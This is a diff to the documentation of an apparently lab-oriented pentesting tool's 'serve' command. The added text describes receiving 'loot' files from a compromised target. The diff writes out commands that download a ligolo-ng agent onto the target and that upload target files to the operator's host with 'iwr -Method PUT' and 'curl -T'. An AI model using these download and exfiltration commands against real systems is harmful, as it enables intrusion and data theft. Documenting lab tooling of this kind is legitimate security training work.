@@ -416,13 +416,15 @@ The app keeps a copy of a downloaded index in `/opt/pwn-broker/cache/`, refreshe
 forest/dc01 > serve
 
   ok    serving dc01's upload folder and the tools' files on http://10.10.14.5/k7Qx2p/
-  2 files; serve files shows the download lines
+  2 files; serve files shows the lines to fetch them and to send files back
   serve log shows who fetched what; serve stop ends it
 
 forest/dc01 > serve files agent
 
         iwr http://10.10.14.5/k7Qx2p/ligolo-ng/agent.exe -OutFile agent.exe
 ```
+
+It also takes files back from the target. A `PUT` to the same address and random part, with a file name, saves the file into the target's `loot/` folder; `serve files` ends with the line to send one, `iwr -Method PUT -InFile <file> http://10.10.14.5/k7Qx2p/<file>` on Windows and `curl -T <file> http://10.10.14.5/k7Qx2p/` on Linux.
 
 - `serve` listens on the tunnel's address. `serve eth0` or `serve 192.168.1.20` names an interface or an address of this machine instead; with no tunnel up and nothing named, it says so and starts nothing. `serve 0.0.0.0` listens on every interface, with a `warn` line.
 - The port is 80 as root and 8000 otherwise; `serve tun0 8080` picks one. A port in use is said at once.
@@ -433,6 +435,7 @@ forest/dc01 > serve files agent
 - `serve log` shows the last 20 lines of `/opt/pwn-broker/run/serve/serve.log`: when it started, then one line per request, with the address that asked, the request and the answer.
 - It outlives `quit` and a closed window. `finish` lists it in its summary as `serving  http://10.10.14.5/   (will be stopped)` and stops it; a server another box started is left alone.
 - `upload/` is part of the box, so whatever you put there is in its archives.
+- A file sent back lands in `loot/` under its own name, or `name-2` and on when that is taken: nothing there is ever replaced. It needs the random part, one plain name with no folder and no dot at the start, and a length. One file is at most 4 GiB, and one that would leave less than 1 GiB free on the disk is refused with `507`. A transfer cut short leaves nothing. What lands in `loot/` is not served back, and `serve log` shows `saved loot/<name>` beside the request.
 
 ## Finish, export and import
 
